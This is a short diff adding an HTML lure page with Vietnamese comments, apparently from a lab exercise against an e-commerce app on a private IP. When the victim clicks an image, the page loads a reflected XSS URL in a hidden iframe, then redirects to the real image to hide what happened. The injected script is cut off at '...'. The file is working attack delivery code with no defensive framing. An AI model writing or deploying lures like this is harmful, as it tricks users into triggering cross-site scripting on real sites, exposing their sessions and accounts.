@@ -1,0 +1,14 @@
+<!-- lure.html -->
+<img src="image.jpg" onclick="triggerAttack()">
+<script>
+    function triggerAttack() {
+        // Iframe vô hình sẽ load URL XSS
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = "http://192.168.10.100:8080/E-commerce/account?fn=green&fn_message=%3Cscript%3E...";
+        document.body.appendChild(iframe);
+        
+        // Chuyển hướng người dùng đến ảnh thật
+        setTimeout(() => { window.location.href = 'image.jpg'; }, 200);
+    }
+</script>
